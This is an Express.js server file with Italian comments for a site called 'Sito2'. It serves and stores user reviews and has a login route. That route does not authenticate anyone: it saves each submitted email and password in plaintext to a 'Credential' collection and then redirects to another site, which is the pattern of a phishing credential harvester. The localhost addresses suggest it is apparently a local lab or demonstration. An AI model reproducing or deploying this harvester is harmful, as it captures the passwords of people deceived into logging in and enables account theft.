const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const app = express();

// Configurazione CORS per consentire richieste da Sito1
app.use(cors({
  origin: 'http://localhost:3000', // Permette richieste da Sito1
  methods: ['POST'],
  allowedHeaders: ['Content-Type']
}));

// Configurazione Express
app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Connessione a MongoDB (il database di Sito2)
mongoose.connect(process.env.MONGO_URI || 'mongodb://mongo2:27017/sito2_db')
  .then(() => console.log('Connesso a MongoDB')) // Messaggio se connesso
  .catch(err => console.error('Errore connessione MongoDB:', err)); // Errore se fallisce

// Schema per le credenziali
const credentialSchema = new mongoose.Schema({
  email: String,
  password: String,
  timestamp: { type: Date, default: Date.now }
});
const Credential = mongoose.model('Credential', credentialSchema);

// Schema per le recensioni
const reviewSchema = new mongoose.Schema({
  name: String,
  email: String,
  rating: Number,
  text: String,
});
const Review = mongoose.model('Review', reviewSchema);

// Funzione per validare l'email
function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

// Route GET per la homepage
app.get('/', async (req, res) => {
  try {
    const reviews = await Review.find();
    res.render('index', { reviews: reviews || [], errorMessage: null });
  } catch (err) {
    console.error('Errore caricamento recensioni:', err);
    res.render('index', { reviews: [], errorMessage: 'Errore caricamento recensioni' });
  }
});

// Route POST per il login
app.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    // Validazione
    if (!email || !password) {
      return res.render('index', {
        reviews: await Review.find(),
        errorMessage: 'Compila tutti i campi.'
      });
    }
    if (!isValidEmail(email)) {
      return res.render('index', {
        reviews: await Review.find(),
        errorMessage: 'Email non valida.'
      });
    }

    const credential = new Credential({ email, password });
    await credential.save();
    res.redirect('http://localhost:3000');
  } catch (err) {
    console.error('Errore salvataggio credenziali:', err);
    res.render('index', {
      reviews: await Review.find(),
      errorMessage: 'Errore durante il login'
    });
  }
});

// Route POST per le recensioni
app.post('/review', async (req, res) => {
  try {
    const { name, email, rating, review } = req.body;

    // Validazione
    if (!name || !email || !rating || !review) {
      return res.render('index', {
        reviews: await Review.find(),
        errorMessage: 'Compila tutti i campi.'
      });
    }
    if (!isValidEmail(email)) {
      return res.render('index', {
        reviews: await Review.find(),
        errorMessage: 'Email non valida.'
      });
    }
    if (name.length > 100 || review.length > 1000) {
      return res.render('index', {
        reviews: await Review.find(),
        errorMessage: 'Input troppo lungo.'
      });
    }
    const ratingNum = parseInt(rating);
    if (isNaN(ratingNum) || ratingNum < 1 || ratingNum > 5) {
      return res.render('index', {
        reviews: await Review.find(),
        errorMessage: 'Valutazione deve essere tra 1 e 5.'
      });
    }

    const newReview = new Review({
      name,
      email,
      rating: ratingNum,
      text: review
    });
    await newReview.save();
    res.redirect('/');
  } catch (err) {
    console.error('Errore salvataggio recensione:', err);
    res.render('index', {
      reviews: await Review.find(),
      errorMessage: 'Errore salvataggio recensione'
    });
  }
});

const PORT = process.env.PORT || 4000;
app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));